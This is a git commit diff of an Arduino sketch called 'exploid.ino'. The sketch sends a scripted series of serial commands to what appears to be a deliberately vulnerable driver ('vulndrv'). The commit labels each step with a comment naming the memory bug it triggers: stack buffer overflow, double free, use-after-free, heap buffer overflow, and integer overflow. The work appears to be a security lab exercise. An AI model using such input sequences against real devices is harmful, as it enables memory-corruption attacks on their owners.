5b82dee11d58e434a8bb9ad4b1abc842b816fb28
Muhammed Talha Ugurel <muhammedtalhaugurel@gmail.com>
2025-07-31 07:18:00 +0300

    ADD Comment lines

--- src/exploid/exploid/exploid.ino
+++ src/exploid/exploid/exploid.ino
@@ -7,8 +7,10 @@ void setup() {
   delay(1000);
   Serial.print("pname\n");
   delay(1000);
+  // Stack Buffer Overflow
   Serial.print("aaaaaaaaaaaaaaaaa");
   delay(1000);
+  // Stack Buffer Overflow
   Serial.print("ccount\n");
   delay(1000);
   Serial.print("2\n");
@@ -16,24 +18,38 @@ void setup() {
   Serial.print("done\n");
   delay(1000);
 
+  // Double Free
   Serial.print("reset\n");
   delay(1000);
   Serial.print("reset\n");
   delay(1000);
+  // Double Free
+  // Use After Free
   Serial.print("pname\n");
+  delay(1000);
+  // Use After 
+  Serial.print("key\n");
+  delay(1000);
+  Serial.print("vulndrv\n");
   delay(1000);
   Serial.print("joystick\n");
   delay(1000);
   Serial.print("ccount\n");
   delay(1000);
+  // Heap Buffer Overflow
   Serial.print("2\n");
   delay(1000);
   Serial.print("done\n");
   delay(1000);
   Serial.print("120, 80, 1\n");
   delay(1000);
+  // Heap Buffer Overflow
 
   Serial.print("reset\n");
+  delay(1000);
+  Serial.print("key\n");
+  delay(1000);
+  Serial.print("vulndrv\n");
   delay(1000);
   Serial.print("pname\n");
   delay(1000);
@@ -41,8 +57,10 @@ void setup() {
   delay(1000);
   Serial.print("ccount\n");
   delay(1000);
+  // Int Overflow
   Serial.print("2147483648\n");
   delay(1000);
+  // Int Overflow
   Serial.print("done\n");
   delay(1000);
 }
